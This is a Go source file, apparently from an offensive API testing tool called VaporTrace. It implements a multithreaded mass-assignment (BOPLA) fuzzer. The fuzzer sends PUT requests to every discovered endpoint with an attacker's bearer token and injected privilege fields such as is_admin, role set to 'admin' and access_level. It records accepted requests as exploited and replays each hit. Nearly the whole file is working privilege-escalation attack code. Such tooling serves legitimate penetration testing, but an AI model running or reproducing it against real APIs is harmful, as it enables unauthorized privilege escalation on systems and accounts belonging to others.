package logic

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"sync" // Required for Phase 9.8 Concurrency

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/pterm/pterm"
)

// BOPLAContext defines the target and the base payload to fuzz
type BOPLAContext struct {
	TargetURL string
	Method    string // Usually PATCH or PUT
	BaseJSON  string // The valid JSON body captured from the proxy
}

// Common administrative properties to inject for API3:2023 (Mass Assignment)
var administrativeKeys = []string{
	"is_admin", "isAdmin", "role", "privileges", "status", "verified",
	"permissions", "group_id", "internal_flags", "account_type",
	"is_staff", "can_delete", "access_level",
}

// ExecuteMassBOPLA (Phase 9.8) automates property fuzzing across the discovery pipeline
func ExecuteMassBOPLA(concurrency int) {
	pterm.DefaultSection.Println("Phase 9.8: Industrialized BOPLA Engine")

	var targets []string
	GlobalDiscovery.mu.Lock()
	for _, path := range GlobalDiscovery.Endpoints {
		// Heuristic: Targeted selection for write-capable endpoints
		targets = append(targets, path)
	}
	GlobalDiscovery.mu.Unlock()

	if len(targets) == 0 {
		pterm.Warning.Println("No targets found in discovery store. Run 'map' or 'swagger' first.")
		return
	}

	for _, url := range targets {
		pterm.Info.Printfln("Starting mass property fuzzing on: %s", url)
		
		// Create a baseline context for this specific URL
		ctx := &BOPLAContext{
			TargetURL: url,
			Method:    "PUT", // Defaulting to PUT for property updates
			BaseJSON:  "{}",    // Initializing empty JSON if no baseline provided
		}
		
		ctx.MassFuzz(concurrency)
	}
}

// MassFuzz implements the Phase 9.3 Worker Pool for JSON property injection
func (b *BOPLAContext) MassFuzz(threads int) {
	keyChan := make(chan string, len(administrativeKeys))
	var wg sync.WaitGroup

	pb, _ := pterm.DefaultProgressbar.WithTotal(len(administrativeKeys)).WithTitle("Fuzzing Properties").Start()

	// 1. Spawn Worker Pool
	for w := 1; w <= threads; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for key := range keyChan {
				b.InjectAndProbeSilent(key)
				pb.Increment()
			}
		}()
	}

	// 2. Feed Keys
	for _, key := range administrativeKeys {
		keyChan <- key
	}
	close(keyChan)

	// 3. Wait for workers
	wg.Wait()
	pb.Stop()
}

// InjectAndProbeSilent handles high-speed execution with SafeDo mirroring (Phase 9.6)
func (b *BOPLAContext) InjectAndProbeSilent(key string) {
	activeToken := CurrentSession.AttackerToken

	// 1. Prepare Payload
	var data map[string]interface{}
	_ = json.Unmarshal([]byte(b.BaseJSON), &data)
	if data == nil {
		data = make(map[string]interface{})
	}

	// Logic for value injection based on key type
	data[key] = true
	if key == "role" { data[key] = "admin" }
	if key == "group_id" { data[key] = 0 }

	payload, _ := json.Marshal(data)

	// 2. Prepare Request
	req, _ := http.NewRequest(b.Method, b.TargetURL, bytes.NewBuffer(payload))
	req.Header.Set("Content-Type", "application/json")
	if activeToken != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", activeToken))
	}

	// 3. Execute via SafeDo (Phase 9.6 Mirroring)
	resp, err := SafeDo(req, false, "BOPLA-ENGINE")
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// 4. Analysis: Success codes indicate the property was accepted
	if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusCreated {
		pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgMagenta, pterm.FgWhite)}
		pterm.Warning.Printfln(" BOPLA Success: Key [%s] accepted by %s", key, b.TargetURL)

		// PERSISTENCE
		db.LogQueue <- db.Finding{
			Phase:   "PHASE 9.8: INDUSTRIALIZED BOPLA",
			Target:  b.TargetURL,
			Details: fmt.Sprintf("Mass Assignment: property '%s' accepted", key),
			Status:  "EXPLOITED",
		}

		// Background Hit-Mirroring for IR visibility
		go func() {
			hitReq, _ := http.NewRequest(b.Method, b.TargetURL, bytes.NewBuffer(payload))
			hitReq.Header.Set("Content-Type", "application/json")
			if activeToken != "" {
				hitReq.Header.Set("Authorization", fmt.Sprintf("Bearer %s", activeToken))
			}
			SafeDo(hitReq, true, "BOPLA-ENGINE")
		}()
	}
}

// Fuzz remains as the legacy surgical single-threaded method
func (b *BOPLAContext) Fuzz() {
	pterm.DefaultHeader.WithFullWidth(false).Println("BOPLA Surgical Fuzzer")
	b.MassFuzz(1) 
}